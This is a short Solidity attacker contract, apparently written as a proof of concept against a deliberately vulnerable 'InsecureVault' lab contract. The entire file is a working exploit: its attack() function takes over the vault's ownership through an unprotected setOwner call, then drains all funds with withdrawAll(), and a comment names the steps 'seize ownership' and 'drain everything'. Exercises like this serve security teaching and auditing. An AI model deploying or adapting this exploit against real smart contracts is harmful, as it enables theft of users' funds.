// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {InsecureVault} from "./InsecureVault.sol";

contract VaultAttacker {
    InsecureVault public vault;

    constructor(address _vault) {
        vault = InsecureVault(_vault);
    }

    // Step 1: seize ownership  |  Step 2: drain everything
    function attack() external {
        vault.setOwner(address(this));
        vault.withdrawAll();
    }

    receive() external payable {}
}